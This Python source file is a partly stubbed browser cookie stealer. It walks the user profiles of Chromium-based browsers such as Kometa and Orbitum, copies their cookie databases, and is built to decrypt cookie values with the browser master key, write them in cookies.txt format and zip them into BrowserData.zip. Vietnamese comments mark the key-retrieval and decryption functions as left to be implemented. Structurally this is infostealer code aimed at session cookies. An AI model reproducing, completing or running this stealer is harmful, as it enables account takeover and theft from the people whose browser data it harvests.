import base64
import json
import os
import random
import sqlite3
import threading
from Cryptodome.Cipher import AES
import shutil
import zipfile
from typing import Union
from win32crypt import CryptUnprotectData

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            # (Các trình duyệt khác)
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]
        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [self.cookies]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.create_zip()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = self.create_temp()
        shutil.copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()

    def create_zip(self):
        file_paths = [
            os.path.join(self.temp_path, "Browser", "cookies.txt"),
        ]
        zip_file_path = os.path.join(os.path.dirname(__file__), "BrowserData.zip")
        self.create_zip_file(file_paths, zip_file_path)

    def create_zip_file(self, file_paths: list, zip_path: str):
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for file in file_paths:
                if os.path.isfile(file):
                    zipf.write(file, os.path.basename(file))

    def create_temp(self, _dir: Union[str, os.PathLike] = None):
        if _dir is None:
            _dir = os.path.expanduser("~/tmp")
        if not os.path.exists(_dir):
            os.makedirs(_dir)
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        open(path, "x").close()
        return path

    def get_master_key(self, local_state_path):
        # Bạn cần triển khai phương thức này nếu chưa có
        pass

    def decrypt_password(self, encrypted_value, masterkey):
        # Bạn cần triển khai phương thức này nếu chưa có
        pass

if __name__ == "__main__":
    Browsers()
